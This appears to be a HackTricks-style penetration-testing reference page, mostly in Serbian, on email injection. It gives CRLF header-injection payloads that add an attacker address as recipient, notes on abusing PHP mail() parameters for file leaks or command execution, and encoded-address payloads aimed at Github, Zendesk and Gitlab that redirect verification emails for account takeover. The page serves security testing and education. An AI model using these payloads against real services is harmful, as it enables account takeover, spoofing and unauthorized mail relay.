# Email Injections

{{#include ../banners/hacktricks-training.md}}

## Inject in sent e-mail

### Inject Cc i Bcc nakon argumenta poÅ¡iljaoca
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
Poruka Ä‡e biti poslata na naloge recipient i recipient1.

### Inject argument
```
From:sender@domain.com%0ATo:attacker@domain.com
```
Poruka Ä‡e biti poslata originalnom primaocu i nalogu napadaÄa.

### Umetanje argumenta Subject
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
LaÅ¾ni predmet Ä‡e biti dodat originalnom predmetu i u nekim sluÄajevima Ä‡e ga zameniti. To zavisi od ponaÅ¡anja usluge e-poÅ¡te.

### Promenite telo poruke

Ubaci dva nova reda, a zatim napiÅ¡i svoju poruku da bi promenio telo poruke.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### Eksploatacija PHP mail() funkcije
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### Peti parametar ($additional_parameters)

Ovaj deo Ä‡e se zasnivati na **kako zloupotrebiti ovaj parametar pod pretpostavkom da napadaÄ njime upravlja**.

Ovaj parametar Ä‡e biti dodat u komandnu liniju koju Ä‡e PHP koristiti za pozivanje binarnog sendmail. MeÄ‘utim, biÄ‡e sanitizovan funkcijom `escapeshellcmd($additional_parameters)`.

NapadaÄ moÅ¾e **ubaciti dodatne parametre za sendmail** u ovom sluÄaju.

#### Razlike u implementaciji /usr/sbin/sendmail

**sendmail** interfejs je **obezbeÄ‘en od strane MTA email softvera** (Sendmail, Postfix, Exim itd.) instaliranog na sistemu. Iako **osnovna funkcionalnost** (kao Å¡to su -t -i -f parametri) ostaje **ista** iz razloga kompatibilnosti, **druge funkcije i parametri** se znaÄajno razlikuju u zavisnosti od instaliranog MTA.

Evo nekoliko primera razliÄitih man stranica za sendmail komandu/interfejs:

- Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
- Postfix MTA: http://www.postfix.org/mailq.1.html
- Exim MTA: https://linux.die.net/man/8/eximReferences

U zavisnosti od **izvora sendmail** binarne datoteke otkrivene su razliÄite opcije za zloupotrebu i **curenje fajlova ili Äak izvrÅ¡avanje proizvoljnih komandi**. Proverite kako u [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## Ubacivanje u ime e-poÅ¡te

> [!CAUTION]
> Imajte na umu da ako uspete da kreirate nalog u servisu sa proizvoljnim imenom domena (kao Å¡to su Github, Gitlab, CloudFlare Zero trust...) i verifikujete ga primajuÄ‡i verifikacioni email na vaÅ¡u adresu, moÅ¾da Ä‡ete moÄ‡i da pristupite osetljivim lokacijama kompanije Å¾rtve.

### Ignorisani delovi e-poÅ¡te

Simboli: **+, -** i **{}** u retkim sluÄajevima mogu se koristiti za oznaÄavanje i veÄ‡ina e-mail servera ih ignoriÅ¡e.

- Npr. john.doe+intigriti@example.com â†’ john.doe@example.com

**Komentari izmeÄ‘u zagrada ()** na poÄetku ili kraju Ä‡e takoÄ‘e biti ignorisani.

- Npr. john.doe(intigriti)@example.com â†’ john.doe@example.com

### ZaobilaÅ¾enje bele liste

<figure><img src="../images/image (812).png" alt="https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### Navodi

<figure><img src="../images/image (626).png" alt="https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IP adrese

TakoÄ‘e moÅ¾ete koristiti IP adrese kao imena domena izmeÄ‘u uglastih zagrada:

- john.doe@\[127.0.0.1]
- john.doe@\[IPv6:2001:db8::1]

### Kodiranje e-poÅ¡te

Kao Å¡to je objaÅ¡njeno u [**ovoj studiji**](https://portswigger.net/research/splitting-the-email-atom), imena e-poÅ¡te takoÄ‘e mogu sadrÅ¾ati kodirane karaktere:

- **PHP 256 overflow**: PHP `chr` funkcija Ä‡e nastaviti da dodaje 256 karakteru dok ne postane pozitivan, a zatim izvrÅ¡iti operaciju `%256`.
- `String.fromCodePoint(0x10000 + 0x40) // ğ€ â†’ @`

> [!TIP]
> Cilj ovog trika je da se zavrÅ¡i sa injekcijom poput `RCPT TO:<"collab@psres.net>collab"@example.com>`\
> koja Ä‡e poslati verifikacioni email na drugu adresu e-poÅ¡te od oÄekivane (tako da se unese druga adresa e-poÅ¡te unutar imena e-poÅ¡te i prekine sintaksa prilikom slanja e-poÅ¡te).

RazliÄita kodiranja:
```bash
# Format
=? utf-8 ? q ? =41=42=43 ?= hi@example.com --> ABChi@example.com

# =? -> Start of encode
# utf-8 -> encoding used
# ? -> separator
# q -> type of encoding
# ? -> separator
# =41=42=43 -> Hex encoded data
# ?= end of encoding

# Other encodings, same example:
#Â iso-8859-1
=?iso-8859-1?q?=61=62=63?=hi@example.com
# utf-8
=?utf-8?q?=61=62=63?=hi@example.com
# utf-7
=?utf-7?q?<utf-7 encoded string>?=hi@example.com
# q encoding + utf-7
=?utf-7?q?&=41<utf-7 encoded string without initial A>?=hi@example.com
# base64
=?utf-8?b?QUJD?=hi@example.com
# bas64 + utf-7
=?utf-7?q?<utf-7 encoded string in base64>?=hi@example.com
#punycode
x@xn--svg/-9x6 â†’ x@<svg/
```
Payloads:

- Github: `=?x?q?collab=40psres.net=3e=00?=foo@example.com`
- Imajte na umu da je kodirani `@` kao =40, kodirani `>` kao `=3e` i `null` kao `=00`
- PoslaÄ‡e verifikacioni email na `collab@psres.net`
- Zendesk: `"=?x?q?collab=22=40psres.net=3e=00==3c22x?="@example.com`
- Ista trik kao pre, ali dodajuÄ‡i neku obiÄnu navodnu reÄ na poÄetku i kodiranu navodnu reÄ `=22` pre kodiranog `@`, a zatim otvarajuÄ‡i i zatvarajuÄ‡i neke navodne reÄi pre sledeÄ‡eg emaila kako bi se ispravila sintaksa koju koristi Zendesk
- PoslaÄ‡e verifikacioni email na `collab@psres.net`
- Gitlab: `=?x?q?collab=40psres.net_?=foo@example.com`
- Imajte na umu upotrebu donje crte kao razmaka za odvajanje adrese
- PoslaÄ‡e verifikacioni email na `collab@psres.net`
- Punycode: KoriÅ¡Ä‡enjem Punycode-a bilo je moguÄ‡e injektovati oznaku `<style` u Joomla i zloupotrebiti je za kraÄ‘u CSRF tokena putem CSS eksfiltracije.

#### Tooling

- Postoji **Burp Suite Turbo Intruder skripta** za fuzzing ovih vrsta kombinacija kako bi se pokuÅ¡ao napad na email formate. Skripta veÄ‡ ima potencijalno funkcionalne kombinacije.
- TakoÄ‘e je moguÄ‡e koristiti [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) za kreiranje napada deljenja emaila

### Other vulns

![https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0](<../images/image (1131).png>)

## Third party SSO

### XSS

Neke usluge kao Å¡to su **github** ili **salesforce** omoguÄ‡avaju vam da kreirate **email adresu sa XSS payload-ima**. Ako moÅ¾ete **koristiti ove provajdere za prijavu na druge usluge** i te usluge **ne sanitizuju** ispravno email, mogli biste izazvati **XSS**.

### Account-Takeover

Ako **SSO usluga** omoguÄ‡ava da **kreirate nalog bez verifikacije date email adrese** (kao Å¡to je **salesforce**) i zatim moÅ¾ete koristiti taj nalog za **prijavu na drugu uslugu** koja **veruje** salesforce, mogli biste pristupiti bilo kojem nalogu.\
_Napomena da salesforce oznaÄava da li je data email adresa verifikovana ili ne, ali takoÄ‘e aplikacija treba uzeti u obzir ove informacije._

## Reply-To

MoÅ¾ete poslati email koristeÄ‡i _**From: company.com**_ i _**Replay-To: attacker.com**_ i ako se bilo koja **automatska odgovor** poÅ¡alje zbog toga Å¡to je email poslat **sa** **internog adresa**, **napadaÄ** moÅ¾e biti u moguÄ‡nosti da **primi** taj **odgovor**.

## Hard Bounce Rate

OdreÄ‘ene usluge, kao Å¡to je AWS, implementiraju prag poznat kao **Hard Bounce Rate**, obiÄno postavljen na 10%. Ovo je kritiÄna metrika, posebno za usluge dostave emaila. Kada se ovaj procenat prekoraÄi, usluga, kao Å¡to je AWS-ova email usluga, moÅ¾e biti suspendovana ili blokirana.

**Hard bounce** se odnosi na **email** koji je vraÄ‡en poÅ¡iljaocu jer je adresa primaoca nevaÅ¾eÄ‡a ili ne postoji. To se moÅ¾e dogoditi iz raznih razloga, kao Å¡to su **email** poslat na nepostojeÄ‡u adresu, domen koji nije stvaran, ili odbijanje servera primaoca da prihvati **emailove**.

U kontekstu AWS-a, ako poÅ¡aljete 1000 emailova i 100 od njih rezultira hard bounce-ovima (zbog razloga kao Å¡to su nevaÅ¾eÄ‡e adrese ili domeni), to bi znaÄilo 10% hard bounce rate. Dostizanje ili prekoraÄenje ovog procenta moÅ¾e pokrenuti AWS SES (Simple Email Service) da blokira ili suspenduje vaÅ¡e moguÄ‡nosti slanja emaila.

VaÅ¾no je odrÅ¾avati nizak hard bounce rate kako bi se osigurala neprekidna usluga emaila i odrÅ¾ala reputacija poÅ¡iljaoca. PraÄ‡enje i upravljanje kvalitetom email adresa u vaÅ¡im mailing listama moÅ¾e znaÄajno pomoÄ‡i u postizanju ovog cilja.

Za detaljnije informacije, moÅ¾e se konsultovati zvaniÄna dokumentacija AWS-a o upravljanju bounce-ovima i prituÅ¾bama [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types).

## References

- [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
- [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
- [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
- [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0)

{{#include ../banners/hacktricks-training.md}}
